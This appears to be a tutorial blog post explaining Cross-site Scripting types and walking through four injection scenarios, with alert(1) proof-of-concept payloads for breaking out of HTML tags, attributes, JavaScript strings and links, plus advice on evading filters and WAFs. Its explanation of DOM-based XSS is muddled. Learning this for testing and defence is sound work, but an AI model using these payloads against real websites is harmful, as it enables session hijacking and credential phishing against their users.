---
layout: post
title: Cross-site Scripting (XSS)
description: >

tags: [webapp]
---

  **Cross-site Scripting (XSS)** is a vulnerability which allows an attacker to execute malicious JavaScripts or html code via input fields on the victim machine to steal session cookies which can be used to hijack the victim account  

Cross-site Scripting (XSS) is an attack is performed with a crafted malicious Javascript inserted into the application user input which is then stored on the database of the application. Whenever any user visits that particular, the crafted Javascript gets executed and the user session information will be transferred to the attacker server.  

### Practical Scenario
Consider a vulnerable banking application, the attacker crafts a HTML Page with login feature keeping the application background as the same. Further he injects the crafted HTML page into the application and it gets stored on the database. Whoever a user visits the page, it prompts for login. If the user enter credentials, it wil be sent to the attacker in background but the user does not aware of the same. As a result, the userís account is compromised and all the money is stolen.  

### What are the attacks can be performed?
- Allows an attacker to: 
 - Steal Session Cookies (Can hijack victim session)
 - Redirect users to malicious sites
 - Perform Phishing Attack
 - Prompt users to download Malwares (embedded within the code)
 - Website Defacement  
### Prone Vectors for XSS 
- User Input Fields
- HTTP Headers (User-Agent, Referrer etc) 
## Types of Cross-site Scripting (XSS)   
### Reflected Cross-site Scripting (XSS)
  In this type, the user input will be reflected only once. Whenever the user clicks on the link it gets executed. Hence, the malicious script will be executed once on the victim machines
{:.lead}  
### Stored Cross-site Scripting (XSS)
  In this type, the user input will be stored in the database on the same location. Whenever any user visits the injected page, the malicious script will be executed. Hence, the malicious script will be executed to every user whoever visits the injected page on the victim machine
{:.lead}  
### DOM-based Cross-site Scripting (XSS)
 In this type, the user input will be stored on the DOM Parser of the victim machine. Whenever the user visits the injected page, the script which is stored on the DOM Parser will be executed. Hence, the malicious script will be executed on the victim machine. Here the difference is, "It stores the malicious script on the victim browser (DOM Parser)"¬ù
{:.lead}  
### How Does it Work? 
Let's have look at different scenarios:

**Scenario 1:**  
Step1: User entered "Hello" to in search box and reflected the input as shown 

![](https://raw.githubusercontent.com/n0tak1dd1y/master/assets/webapp/1.PNG)

Step2: Press "CTRL+U" to see the source code and note the location of User input as shown  

![](https://raw.githubusercontent.com/n0tak1dd1y/master/assets/webapp/2.PNG)

Step3: Enter below payload in search box as shown
 ```js
<svg onload="alert(1)">
``` 
![](https://raw.githubusercontent.com/n0tak1dd1y/master/assets/webapp/3.PNG) 

Step4: Voila!!! got executed  

![](https://raw.githubusercontent.com/n0tak1dd1y/master/assets/webapp/4.PNG)

Step5: Now Press "CTRL+U" to see the how the script is reflected in the source code  

![](https://raw.githubusercontent.com/n0tak1dd1y/master/assets/webapp/5.PNG)

Step6: Note the script is placed between "<p></p>". It shows that we can pass all the tags which has the syntax as "<></>" or "<>"  
For Example: 
~~~html
<script>alert(1)</script>, <a href="javascript:alert(1)">hello</a>
<img src=1 onerror="alert(1)">
~~~
**Scenario 2:** 

Input as
~~~html
<input type=text name="Search" value="books">
~~~

Your search results are : <input type=text name="Search"  value="books">

**Attack**

Input as
~~~html
<input type=text name="Search" value="books"><script>alert(1)</script>">
<input type=text name="Search" value="books" onmouseover="alert(1)">
~~~

Output as

Your search results are :
~~~html
<input type=text name="Search" value="books"><script>alert(1)</script>">
~~~
Once the page loaded script will be executed
~~~html
<input type=text name=" Search" value="books" onmouseover="alert(1)">
~~~
When the user hover the mouse on books, script will be executed. 

These are called eventhandlers which are responsible for executing the function when an appropriate event is occurred. 
Voila!!! Our scripts are executed. 
In the scenario, the payloads can only be framed as shown: 
It should start with either: ">< or " eventhandlers 
These are the only way to fix the syntax with the malicious script. 
**Scenario 3:**

Input as
~~~html
<input type=text name="search" value="books">
~~~
Output as
~~~html
  Var search="books";
  Var search="books";
~~~

**Attack**

Input as
~~~html
<input type=text name="search" value="books";alert(1);//hell">
~~~
Output as
~~~html
   Var search="books";alert(1);//hell";
   Var search="books";alert(1);//hell";
~~~
Voila!!! our payload got executed

Here the logic is payload sits between " in the javascript syntax.

Hence, we need to fix it with javascript syntax.

Only the below shown payload can be used :
~~~html
  ";alert(1)//11
  ";alert(1)//11
~~~
**Scenario 4: Trigger XSS with links**

Input as
~~~html
   <input type=text name="link" value="any url">
~~~
Output as

Your Search results are as : any url 
**Attack**

Input as
~~~html
  <input type=text name="link" value="<a href=javascript:alert(1)">Click here</a>">
~~~
Output as

Your Search results are as :  Click Here 
Voila!!! The script gets executed on clicking the link
The above mentioned payload can be used to bypass many filters in the current scenarios 
There are many ways to use a particular payload, I have just shown few variations to understand how an xss payload can be created or framed.
Depends on the WAF, filters, we need to use different "EvenHandlers, HTML tags" to perform XSS.
Explore as many functions, tags as possible to be effective in XSS along with encoding techniques
